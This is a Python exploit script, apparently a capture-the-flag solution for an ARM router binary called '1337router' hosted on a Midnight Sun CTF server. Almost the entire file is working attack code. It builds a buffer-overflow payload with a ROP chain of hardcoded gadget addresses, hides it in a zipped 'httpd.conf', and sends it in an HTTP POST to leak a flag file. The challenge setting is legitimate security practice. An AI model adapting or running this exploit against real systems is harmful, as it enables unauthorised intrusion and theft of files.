#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import zipfile

bin_file = './1337router'
context(os = 'linux', arch = 'arm')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':['./qemu-arm', '-g', '3333', bin_file]}, \
                        local   = {'argv':['./qemu-arm', bin_file]}, \
                        remote  = {'host':'pwn.midnightsunctf.se', 'port':5555})
env.select()

#==========

addr_pop_r0     = 0x00084574
addr_pop_r1     = 0x000849ec
addr_leak       = 0x00010934
addr_buf        = 0x000aef4c
addr_request    = 0xbbd6c

zip_name    = 'test.zip'

#==========

def attack(conn):
    exploit  = 'a'*0x208
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_pop_r1)
    exploit += p32(addr_buf)
    exploit += p32(addr_pop_r0)
    exploit += p32(addr_request+0x20)
    exploit += p32(addr_leak)
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('httpd.conf', exploit)

    request  = 'POST /page?=conf HTTP/1.1\r\n'
    request += 'txt: ./flag\x00\r\n'
    request += 'Content-Type: application/zip\r\n\r\n'
    request += open(zip_name, 'rb').read()
    conn.send(request)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
